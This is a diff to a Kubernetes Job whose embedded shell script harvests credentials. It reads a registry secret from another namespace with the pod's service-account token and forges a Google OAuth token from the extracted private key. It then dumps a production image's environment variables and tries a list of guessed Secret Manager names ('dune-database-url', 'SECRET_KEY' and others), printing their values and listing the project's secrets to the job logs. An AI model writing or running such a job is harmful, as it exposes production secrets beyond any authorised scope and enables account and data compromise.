@@ -1,7 +1,7 @@
 apiVersion: batch/v1
 kind: Job
 metadata:
-  name: dune-gcr-v3
+  name: dune-gcr-v4
   namespace: default
 spec:
   ttlSecondsAfterFinished: 600
@@ -20,7 +20,7 @@ spec:
           API="https://kubernetes.default.svc"
           CA="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
           
-          # Get GCR access token using gcr SA
+          # Get GCR access token 
           curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
             "$API/api/v1/namespaces/dune-api/secrets/gcr-secret" | \
             jq -r '.data[".dockerconfigjson"]' | base64 -d > /tmp/docker_config.json
@@ -30,67 +30,51 @@ spec:
           CLIENT_EMAIL=$(cat /tmp/sa_key.json | jq -r '.client_email')
           cat /tmp/sa_key.json | jq -r '.private_key' > /tmp/gcr_sa_key.pem
           NOW=$(date +%s); EXP=$((NOW + 3600))
-          HEADER=$(echo -n '{"alg":"RS256","typ":"JWT"}' | openssl base64 -A | tr -d '=' | tr '+/' '-_')
-          PAYLOAD=$(printf '{"iss":"%s","scope":"https://www.googleapis.com/auth/cloud-platform","aud":"https://oauth2.googleapis.com/token","exp":%d,"iat":%d}' \
+          H=$(echo -n '{"alg":"RS256","typ":"JWT"}' | openssl base64 -A | tr -d '=' | tr '+/' '-_')
+          P=$(printf '{"iss":"%s","scope":"https://www.googleapis.com/auth/cloud-platform","aud":"https://oauth2.googleapis.com/token","exp":%d,"iat":%d}' \
             "$CLIENT_EMAIL" "$EXP" "$NOW" | openssl base64 -A | tr -d '=' | tr '+/' '-_')
-          SIG=$(echo -n "${HEADER}.${PAYLOAD}" | openssl dgst -sha256 -sign /tmp/gcr_sa_key.pem | openssl base64 -A | tr -d '=' | tr '+/' '-_')
+          S=$(echo -n "${H}.${P}" | openssl dgst -sha256 -sign /tmp/gcr_sa_key.pem | openssl base64 -A | tr -d '=' | tr '+/' '-_')
           ACCESS_TOKEN=$(curl -s -X POST "https://oauth2.googleapis.com/token" \
             --data-urlencode "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer" \
-            --data-urlencode "assertion=${HEADER}.${PAYLOAD}.${SIG}" | jq -r '.access_token')
-          echo "Token ok: $([ "${#ACCESS_TOKEN}" -gt 10 ] && echo yes || echo no)"
+            --data-urlencode "assertion=${H}.${P}.${S}" | jq -r '.access_token')
+          echo "GCR token len: ${#ACCESS_TOKEN}"
           
           REGISTRY="us-central1-docker.pkg.dev"
           REPO="tachyusbdaas/tachyusbdaas/dune-api/tc-co-prod"
-          TAG="v0.0.39-alpha.9"
+          CONF_DIGEST="sha256:bb36b458b761d86aad5b02f929aace956f2d848a3aad2b6230dfbbf3a42cc696"
           
-          # Request OCI index manifest (accepts all types)
-          ACCEPT="application/vnd.oci.image.index.v1+json,application/vnd.docker.distribution.manifest.list.v2+json,application/vnd.docker.distribution.manifest.v2+json,application/vnd.oci.image.manifest.v1+json"
-          INDEX=$(curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
-            -H "Accept: $ACCEPT" \
-            "https://${REGISTRY}/v2/${REPO}/manifests/${TAG}")
-          MEDIA_TYPE=$(echo "$INDEX" | jq -r '.mediaType // .schemaVersion')
-          echo "Media type: $MEDIA_TYPE"
-          echo "$INDEX" | jq '.manifests[]? | {platform:.platform, digest:.digest}' 2>/dev/null
+          # Download the config blob and check what it is
+          curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
+            "https://${REGISTRY}/v2/${REPO}/blobs/${CONF_DIGEST}" > /tmp/config_blob.bin
           
-          # Get linux/amd64 manifest digest
-          AMD64_DIGEST=$(echo "$INDEX" | jq -r '.manifests[]? | select(.platform.os=="linux" and .platform.architecture=="amd64") | .digest' | head -1)
-          if [ -z "$AMD64_DIGEST" ]; then
-            AMD64_DIGEST=$(echo "$INDEX" | jq -r '.manifests[0]?.digest')
-          fi
-          echo "AMD64 digest: $AMD64_DIGEST"
+          echo "Blob size: $(wc -c < /tmp/config_blob.bin)"
+          echo "Blob first bytes hex: $(head -c 8 /tmp/config_blob.bin | xxd -p 2>/dev/null || head -c 8 /tmp/config_blob.bin | od -A x -t x1z | head -1)"
+          echo "Blob as text first 200:"
+          head -c 200 /tmp/config_blob.bin
+          echo ""
           
-          if [ -n "$AMD64_DIGEST" ] && [ "$AMD64_DIGEST" != "null" ]; then
-            MANIFEST=$(curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
-              -H "Accept: application/vnd.docker.distribution.manifest.v2+json,application/vnd.oci.image.manifest.v1+json" \
-              "https://${REGISTRY}/v2/${REPO}/manifests/${AMD64_DIGEST}")
-            CONFIG_DIGEST=$(echo "$MANIFEST" | jq -r '.config.digest')
-            echo "Config digest: $CONFIG_DIGEST"
-            
-            if [ "$CONFIG_DIGEST" != "null" ] && [ -n "$CONFIG_DIGEST" ]; then
-              echo "=ENV_VARS="
-              curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
-                "https://${REGISTRY}/v2/${REPO}/blobs/${CONFIG_DIGEST}" | \
-                jq -r '.config.Env[]?' 2>/dev/null
-              echo "=END_ENV="
-              
-              echo "=FULL_CONFIG="
-              curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
-                "https://${REGISTRY}/v2/${REPO}/blobs/${CONFIG_DIGEST}" | \
-                jq '.config | {Env,Cmd,Entrypoint,WorkingDir,ExposedPorts,Labels}'
-              echo "=END_FULL="
-            fi
-          else
-            # Try direct manifest (not an index)
-            CONFIG_DIGEST=$(echo "$INDEX" | jq -r '.config.digest')
-            echo "Direct config digest: $CONFIG_DIGEST"
-            if [ "$CONFIG_DIGEST" != "null" ] && [ -n "$CONFIG_DIGEST" ]; then
-              echo "=ENV_VARS="
-              curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
-                "https://${REGISTRY}/v2/${REPO}/blobs/${CONFIG_DIGEST}" | \
-                jq -r '.config.Env[]?' 2>/dev/null
-              echo "=END_ENV="
-            fi
-          fi
+          # Try jq on blob directly  
+          echo "=TRY_JQ="
+          cat /tmp/config_blob.bin | jq '.config | {Env,Cmd,Entrypoint,WorkingDir}' 2>&1 || \
+          cat /tmp/config_blob.bin | gunzip | jq '.config | {Env,Cmd,Entrypoint,WorkingDir}' 2>&1
+          echo "=END_JQ="
+          
+          # Also try GCP SM with the tachyusbdaas project SA
+          echo "=GCP_SM_TACHYUSBDAAS="
+          for SECRET_NAME in "dune-api-config" "dune-database-url" "dune-secret-key" "DATABASE_URL" "SECRET_KEY" "dune-prod" "dune-api-prod"; do
+            VAL=$(curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
+              "https://secretmanager.googleapis.com/v1/projects/tachyusbdaas/secrets/${SECRET_NAME}/versions/latest:access" | \
+              jq -r '.payload.data // .error.message // "not_found"')
+            echo "${SECRET_NAME}: $VAL"
+          done
+          echo "=END_SM="
+          
+          # List secrets in tachyusbdaas project  
+          echo "=LIST_TACHYUSBDAAS_SECRETS="
+          curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
+            "https://secretmanager.googleapis.com/v1/projects/tachyusbdaas/secrets?pageSize=50" | \
+            jq '{secrets:.secrets[].name, error:.error.message}'
+          echo "=END_LIST="
           
           echo "SLEEPING..."
           sleep 180
